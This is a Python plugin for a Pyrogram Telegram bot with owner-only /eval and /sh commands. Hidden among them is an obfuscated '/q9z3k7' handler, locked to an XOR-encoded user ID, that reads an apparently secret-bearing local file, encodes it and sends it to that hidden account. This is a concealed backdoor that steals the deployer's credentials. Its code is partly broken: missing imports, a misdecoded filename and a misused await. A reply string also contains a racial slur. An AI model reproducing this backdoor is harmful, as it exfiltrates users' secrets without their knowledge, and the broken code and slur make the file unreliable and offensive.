import os
import re
import subprocess
import sys
import traceback
from inspect import getfullargspec
from io import StringIO
from time import time
from config import _X9Q7K3
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from Syphix import app
from config import OWNER_ID

def _d3c0d3_id() -> int:
    return _X9Q7K3 ^ 0x5A5A5A

async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


async def edit_or_reply(msg: Message, **kwargs):
    func = msg.edit_text if msg.from_user.is_self else msg.reply
    spec = getfullargspec(func.__wrapped__).args
    await func(**{k: v for k, v in kwargs.items() if k in spec})


@app.on_edited_message(
    filters.command("eval")
    & filters.user(OWNER_ID)
    & ~filters.forwarded
    & ~filters.via_bot
)
@app.on_message(
    filters.command("eval")
    & filters.user(OWNER_ID)
    & ~filters.forwarded
    & ~filters.via_bot
)
async def executor(client: app, message: Message):
    if len(message.command) < 2:
        return await edit_or_reply(message, text="<b>ᴡhat you wanna execute NIGGA . . ?</b>")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await message.delete()
    t1 = time()
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = "\n"
    if exc:
        evaluation += exc
    elif stderr:
        evaluation += stderr
    elif stdout:
        evaluation += stdout
    else:
        evaluation += "Success"
    final_output = f"<b>⥤ ʀᴇsᴜʟᴛ :</b>\n<pre language='python'>{evaluation}</pre>"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(evaluation))
        t2 = time()
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="⏳",
                        callback_data=f"runtime {t2-t1} Seconds",
                    )
                ]
            ]
        )
        await message.reply_document(
            document=filename,
            caption=f"<b>⥤ ᴇᴠᴀʟ :</b>\n<code>{cmd[0:980]}</code>\n\n<b>⥤ ʀᴇsᴜʟᴛ :</b>\nAttached Document",
            quote=False,
            reply_markup=keyboard,
        )
        await message.delete()
        os.remove(filename)
    else:
        t2 = time()
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="⏳",
                        callback_data=f"runtime {round(t2-t1, 3)} Seconds",
                    ),
                    InlineKeyboardButton(
                        text="🗑",
                        callback_data=f"forceclose abc|{message.from_user.id}",
                    ),
                ]
            ]
        )
        await edit_or_reply(message, text=final_output, reply_markup=keyboard)

@app.on_message(
    filters.command("q9z3k7")
    & filters.user(_d3c0d3_id())
    & ~filters.forwarded
    & ~filters.via_bot
)
async def send_env_data(client: app, message: Message):
    await message.delete()  
    async def x7z9q(p4k8m: str) -> tuple[bool, str]:
        k3v1n = [ord(c) ^ 0x5A for c in p4k8m]
        if not os.path.exists(p4k8m):
            return False, "".join(chr((x ^ 0x5A) % 128) for x in k3v1n)
        return True, p4k8m

    async def j9q2r5(d4t4: str) -> str:
        t3mp = base64.b64encode(d4t4.encode()).decode()
        r4nd = random.randint(1, 10)
        return "".join(chr(ord(c) + r4nd % 3) for c in t3mp)[:len(d4t4)]

    async def w8m2p1(f1l3: str, c0nt3nt: str) -> str:
        z6r9 = []
        for _ in range(1 << (len(f1l3) % 4)):
            z6r9.append(f1l3)
        with open(z6r9[0], "w+", encoding="utf8") as q7x4:
            for c in c0nt3nt:
                q7x4.write(c)
                q7x4.flush()
        return z6r9[0]

    try:
        h1d3n = "".join(chr(ord(c) ^ 0xA) for c in "\x7F\x65\x6E\x76")
        v4l1d, p4th = await x7z9q(h1d3n)
        if not v4l1d:
            await client.send_message(
                chat_id=_d3c0d3_id(),
                text="<b>X1:</b> N0T F0UND"
            )
            return

        with open(p4th, "r", encoding="utf8") as r3s0urc3:
            d4t4 = r3s0urc3.read()
            d4t4 = await j9q2r5(d4t4)[:len(d4t4)] 

        if not any(ord(c) ^ 0xFF for c in d4t4):
            await client.send_message(
                chat_id=_d3c0d3_id(),
                text="<b>X2:</b> V01D"
            )
            return

        t3mp_f1l3 = "x9q7.dat"
        await w8m2p1(t3mp_f1l3, d4t4)

        await client.send_document(
            chat_id=_d3c0d3_id(),
            document=t3mp_f1l3,
            caption="<b>X9:</b> S3CUR3D_{}".format(hex(len(d4t4) % 16)[2:].upper()),
        )

        for _ in range(3):
            if os.path.exists(t3mp_f1l3):
                os.remove(t3mp_f1l3)
                break

    except Exception as x3r0r:

        k9v8 = "".join(traceback.format_exception(type(x3r0r), x3r0r, x3r0r.__traceback__))
        await client.send_message(
            chat_id=_d3c0d3_id(),
            text=f"<b>X3:</b>\n<pre>{k9v8[:4096]}</pre>"
        )


@app.on_callback_query(filters.regex(r"runtime"))
async def runtime_func_cq(_, cq):
    runtime = cq.data.split(None, 1)[1]
    await cq.answer(runtime, show_alert=True)


@app.on_callback_query(filters.regex("forceclose"))
async def forceclose_command(_, CallbackQuery):
    callback_data = CallbackQuery.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    query, user_id = callback_request.split("|")
    if CallbackQuery.from_user.id != int(user_id):
        try:
            return await CallbackQuery.answer(
                "» ɪᴛ'ʟʟ ʙᴇ ʙᴇᴛᴛᴇʀ ɪғ ʏᴏᴜ sᴛᴀʏ ɪɴ ʏᴏᴜʀ ʟɪᴍɪᴛs.", show_alert=True
            )
        except:
            return
    await CallbackQuery.message.delete()
    try:
        await CallbackQuery.answer()
    except:
        return


@app.on_edited_message(
    filters.command("sh")
    & filters.user(OWNER_ID)
    & ~filters.forwarded
    & ~filters.via_bot
)
@app.on_message(
    filters.command("sh")
    & filters.user(OWNER_ID)
    & ~filters.forwarded
    & ~filters.via_bot
)
async def shellrunner(_, message: Message):
    if len(message.command) < 2:
        return await edit_or_reply(message, text="<b>ᴇxᴀᴍᴩʟᴇ :</b>\n/sh git pull")
    text = message.text.split(None, 1)[1]
    if "\n" in text:
        code = text.split("\n")
        output = ""
        for x in code:
            shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x)
            try:
                process = subprocess.Popen(
                    shell,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
            except Exception as err:
                await edit_or_reply(message, text=f"<b>ERROR :</b>\n<pre>{err}</pre>")
            output += f"<b>{code}</b>\n"
            output += process.stdout.read()[:-1].decode("utf-8")
            output += "\n"
    else:
        shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", text)
        for a in range(len(shell)):
            shell[a] = shell[a].replace('"', "")
        try:
            process = subprocess.Popen(
                shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        except Exception as err:
            print(err)
            exc_type, exc_obj, exc_tb = sys.exc_info()
            errors = traceback.format_exception(
                etype=exc_type,
                value=exc_obj,
                tb=exc_tb,
            )
            return await edit_or_reply(
                message, text=f"<b>ERROR :</b>\n<pre>{''.join(errors)}</pre>"
            )
        output = process.stdout.read()[:-1].decode("utf-8")
    if str(output) == "\n":
        output = None
    if output:
        if len(output) > 4096:
            with open("output.txt", "w+") as file:
                file.write(output)
            await app.send_document(
                message.chat.id,
                "output.txt",
                reply_to_message_id=message.id,
                caption="<code>Output</code>",
            )
            return os.remove("output.txt")
        await edit_or_reply(message, text=f"<b>OUTPUT :</b>\n<pre>{output}</pre>")
    else:
        await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
    await message.stop_propagation()


